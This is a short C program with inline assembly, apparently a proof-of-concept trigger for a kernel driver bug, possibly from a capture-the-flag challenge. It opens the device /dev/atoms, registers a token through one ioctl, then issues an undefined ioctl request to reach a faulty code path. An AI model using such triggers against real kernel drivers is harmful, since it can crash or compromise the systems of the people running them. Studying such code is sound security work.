// gcc bug.c -masm=intel -nostdlib -static -o bug
#include <fcntl.h>

#define DEV_PATH "/dev/atoms"
#define TOKEN 0xdeadbeef

#define ATOMS_USE_TOKEN	0x4008d900

int open(const char* pathname, int flags, ...);
int close(int fd);
int ioctl(int fd, unsigned long request, ...);

int _start(void){
	int fd = open(DEV_PATH, O_RDWR);
	ioctl(fd, ATOMS_USE_TOKEN, TOKEN);
	ioctl(fd, 0xdeadbeef);
	close(fd);
}

asm(
"open:\n"
"mov rax, 2\n"
"syscall\n"
"ret\n"

"close:\n"
"mov rax, 3\n"
"syscall\n"
"ret\n"

"ioctl:\n"
"mov rax, 16\n"
"syscall\n"
"ret\n"
);

